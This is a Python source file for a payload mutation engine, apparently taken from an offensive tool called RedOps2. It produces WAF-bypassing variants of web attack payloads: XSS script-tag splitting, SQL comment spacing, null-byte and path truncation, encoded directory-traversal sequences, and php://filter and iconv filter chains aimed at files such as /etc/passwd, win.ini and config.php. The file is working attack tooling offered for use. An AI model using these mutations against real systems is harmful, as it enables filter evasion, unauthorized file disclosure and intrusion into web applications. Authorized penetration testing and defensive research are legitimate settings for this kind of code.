import urllib.parse
import html
import random
import base64

class PayloadMutator:
    """
    The 'Mutation Engine' ported from RedOps2.
    Responsible for generating WAF-bypassing variants of a base payload.
    """

    @staticmethod
    def mutate(payload, strategies=None):
        """
        Generates a list of mutated payloads based on selected strategies.
        If strategies is None, applies all relevant defaults.
        """
        variants = set()
        variants.add(payload) # Always include original
        
        if not strategies:
            strategies = ["url_encode", "double_url", "html_entity"]
            
        for strategy in strategies:
            if strategy == "url_encode":
                variants.add(urllib.parse.quote(payload))
            elif strategy == "double_url":
                variants.add(urllib.parse.quote(urllib.parse.quote(payload)))
            elif strategy == "html_entity":
                variants.add(html.escape(payload))
            elif strategy == "null_byte":
                variants.add(payload + "%00")
            elif strategy == "case_toggle":
                variants.add(PayloadMutator._toggle_case(payload))
            elif strategy == "comment_split":
                if "<script>" in payload:
                    variants.add(payload.replace("<script>", "<scr<!-- -->ipt>"))
            elif strategy == "sql_comment":
                variants.add(payload.replace(" ", "/**/"))
            elif strategy == "path_truncation":
                # Typical LFI truncation
                variants.add(payload + ("." * 4096))
            elif strategy == "unicode_traversal":
                # IIS/Tomcat/Java bypasses
                variants.add(payload.replace("../", "..%c0%af"))
                variants.add(payload.replace("../", "..%252f"))
                variants.add(payload.replace("../", "..%c1%9c"))
            elif strategy == "php_wrapper":
                if "etc/passwd" in payload or "win.ini" in payload:
                    variants.add("php://filter/convert.base64-encode/resource=" + payload)
                    variants.add("php://filter/read=convert.base64-encode/resource=" + payload)
            elif strategy == "php_filter_chain":
                # For data extraction using complex iconv-based filter chains (Wave 5/5.1)
                # Example: php://filter/convert.iconv.UTF8.CSUTF16//convert.base64-encode/resource=
                variants.add(f"php://filter/read=convert.base64-encode/resource={payload}") # Added to set, not list
                variants.add(f"php://filter/convert.base64-encode/resource={payload}") # Added to set, not list
                variants.add(f"php://filter/convert.iconv.UTF-8.UTF-16//convert.base64-encode/resource={payload}")
                variants.add(f"php://filter/convert.iconv.UTF-8.CSUTF16//convert.base64-encode/resource={payload}")
                variants.add(f"php://filter/read=string.rot13|convert.base64-encode/resource={payload}")
                variants.add(f"php://filter/zlib.deflate|convert.base64-encode/resource={payload}")
            elif strategy == "lfi_chain":
                 # Advanced PHP Filter Chain (iconv) bypasses (simplified)
                 if "index.php" in payload or "config.php" in payload:
                     variants.add(f"php://filter/convert.iconv.UTF8.CSUTF16//convert.base64-encode/resource={payload}")
                
        return list(variants)

    @staticmethod
    def _toggle_case(s):
        return "".join(c.lower() if i % 2 else c.upper() for i, c in enumerate(s))

    @staticmethod
    def encode_base64(payload):
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def generate_lfi_variants(file_path):
        """
        Specific LFI variants logic from RedOps2
        """
        payloads = [
            file_path,
            "../../../../" + file_path.lstrip("/"),
            "....//....//....//" + file_path.lstrip("/"),
            "..%252f..%252f..%252f" + file_path.lstrip("/"),
        ]
        return payloads
